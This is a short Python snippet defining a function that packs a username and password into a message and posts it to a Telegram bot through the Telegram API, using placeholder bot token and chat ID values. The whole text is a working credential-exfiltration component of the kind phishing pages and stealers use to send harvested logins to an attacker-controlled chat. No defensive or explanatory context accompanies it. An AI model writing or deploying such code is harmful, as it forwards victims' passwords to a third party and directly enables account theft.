import requests

BOT_TOKEN = 'YOUR_BOT_TOKEN'
CHAT_ID = 'YOUR_CHAT_ID'

def send_to_telegram(username, password):
    message = f"📩 Username: {username}\n🔑 Password: {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    response = requests.post(url, data=payload)
    return response.status_code == 200
